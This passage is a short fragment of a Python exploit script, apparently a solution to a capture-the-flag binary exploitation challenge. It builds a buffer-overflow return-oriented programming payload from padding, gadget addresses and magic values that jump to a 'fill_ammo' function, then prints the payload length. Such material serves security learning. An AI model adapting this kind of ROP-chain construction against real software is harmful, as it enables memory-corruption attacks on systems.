...
fill_ammo = 0x4012f5
shellcode = offset*b'A'+ p64(0x000000000040101a) + p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)
print(len(shellcode))
